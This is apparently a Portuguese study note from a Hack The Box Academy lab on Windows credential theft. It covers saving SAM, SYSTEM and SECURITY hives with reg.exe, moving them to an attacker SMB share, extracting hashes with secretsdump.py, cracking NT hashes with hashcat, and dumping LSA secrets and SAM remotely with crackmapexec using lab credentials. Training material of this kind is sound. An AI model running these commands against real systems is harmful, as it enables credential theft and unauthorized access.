Com acesso a um sistema Windows não associado a um domínio, podemos despejar rapidamente os arquivos do banco de dados SAM para transferi-los e quebrar hashes offline. Isso permite continuar os ataques sem manter uma sessão ativa com o alvo. Vamos demonstrar esse processo usando um host de destino, e você pode acompanhar gerando o seu próprio alvo.

## Copiando SAM Registry Hives
Há três hives de registro que podemos copiar se tivermos acesso de administrador local no alvo; cada um terá um propósito específico quando chegarmos ao dump e cracking dos hashes.

| Registro Hive   | Descrição                                                                                                                                                              |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contém os hashes associados às senhas de contas locais. Precisaremos dos hashes para que possamos quebrá-los e obter as senhas de contas de usuários em texto simples. |
| `hklm\system`   | Contém a bootkey do sistema, que é usada para criptografar o banco de dados SAM. Precisaremos da bootkey para descriptografar o banco de dados SAM.                    |
| `hklm\security` | Contém credenciais em cache para contas de domínio. Podemos nos beneficiar de ter isso em um alvo Windows associado a um domínio.                                      |
Podemos criar backups desses hives usando o utilitário `reg.exe`.

#### Usando reg.exe salvar para copiar colmeias do registro

Iniciar o CMD como administrador nos permitirá executar reg.exe para salvar cópias dos hives de registro mencionados anteriormente.

Execute estes comandos abaixo para fazer isso:
```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Precisaremos dos arquivos `hklm\sam` e `hklm\system`, e possivelmente `hklm\security`, que pode conter hashes de credenciais de contas de usuário de domínio em cache. Após salvar os hives offline, usaremos o `smbserver.py` do Impacket e alguns comandos CMD para transferir esses arquivos para um compartilhamento criado em nosso host de ataque.

#### Criando um compartilhamento com smbserver.py
Para criar um compartilhamento com o `smbserver.py`, execute o seguinte comando em Python:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents
```

Aqui está o que cada parte faz:
- `-smb2support`: Habilita suporte para SMB2 e SMB3, garantindo compatibilidade com versões mais recentes do Windows que não suportam SMBv1 por padrão.
- `CompData`: Nome do compartilhamento.
- `/home/ltnbob/Documents`: Diretório no seu host de ataque onde as cópias do hive serão armazenadas.

Isso garantirá que o compartilhamento funcione corretamente com versões mais recentes do SMB e evitará erros de conexão.

Depois que o compartilhamento estiver em execução no host de ataque, podemos usar o comando `move` no alvo do Windows para mover as cópias do Hive para o compartilhamento.

#### Movendo cópias do Hive para compartilhar
```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

Podemos executar o comando `ls` para confirmar se os arquivos foram movidos.

#### Confirmando cópias do Hive transferidas para o host de ataque
```shell-session
NycolasRamos@htb[/htb]$ ls

sam.save  security.save  system.save
```

## Despejando Hashes com secretsdump.py do Impacket
Uma ferramenta incrivelmente útil que podemos usar para despejar os hashes offline é o Impacket's `secretsdump.py`.

Usar secretsdump.py é um processo simples. Tudo o que precisamos fazer é executar secretsdump.py usando Python, então especificar cada arquivo hive que recuperamos do host de destino.

#### Executando secretsdump.py
```shell-session
NycolasRamos@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
![[Pasted image 20240906090650.png]]

O ``secretsdump`` despeja com sucesso os hashes SAM `locais` e também despejaria as informações de logon de domínio em cache se o alvo fosse associado ao domínio e tivesse credenciais em cache presentes em ``hklm\security``. Observe que a primeira etapa que secretsdump executa é direcionar o `system bootkey`antes de prosseguir para despejar o `LOCAL SAM hashes`. Ele não pode despejar esses hashes sem a chave de inicialização porque essa chave de inicialização é usada para criptografar e descriptografar o banco de dados SAM, e é por isso que é importante termos cópias dos hives de registro que discutimos anteriormente nesta seção.

Observe no topo da saída ``secretsdump.py``:
```shell-session
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```
Isso nos diz como ler a saída e quais hashes podemos quebrar. A maioria dos sistemas operacionais Windows modernos armazena a senha como um hash NT.

Sabendo disso, podemos copiar os hashes NT associados a cada conta de usuário em um arquivo de texto e começar a quebrar senhas.

## Quebrando Hashes com Hashcat
Podemos tentar quebrar os hashes usando o hashcat. Como mencionado anteriormente, podemos preencher um arquivo de texto com os hashes NT que conseguimos despejar.

#### Adicionando nthashes a um arquivo .txt
```shell-session
NycolasRamos@htb[/htb]$ sudo vim hashestocrack.txt
```
![[Pasted image 20240906091609.png]]
Agora que os hashes NT estão em nosso arquivo de texto ( `hashestocrack.txt`), podemos usar o Hashcat para quebrá-los.

#### Executando Hashcat contra NT Hashes
O Hashcat tem muitos modos diferentes que podemos usar. Vamos nos concentrar em usar `-m`para selecionar o tipo de hash `1000`para quebrar nossos hashes NT (também conhecidos como hashes baseados em NTLM). Podemos consultar a [página wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) do Hashcat. Usaremos a infame lista de palavras rockyou.txt.

```shell-session
NycolasRamos@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240906091850.png]]

>[!NOTE] É muito comum que as pessoas reutilizem senhas em diferentes contas pessoais e de trabalho.

## Considerações sobre segredos de LSA e dump remoto
Com acesso a credenciais com `local admin privileges`, também é possível para nós direcionar LSA Secrets pela rede. Isso pode nos permitir extrair credenciais de um serviço em execução, tarefa agendada ou aplicativo que usa LSA secrets para armazenar senhas.

#### Despejando segredos LSA remotamente
```shell-session
NycolasRamos@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
![[Pasted image 20240906092109.png]]

#### Despejando SAM remotamente
Também podemos despejar hashes do banco de dados SAM remotamente.

```shell-session
NycolasRamos@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
![[Pasted image 20240906092135.png]]
Pratique cada técnica ensinada nesta seção enquanto trabalha para responder às perguntas desafiadoras.












































































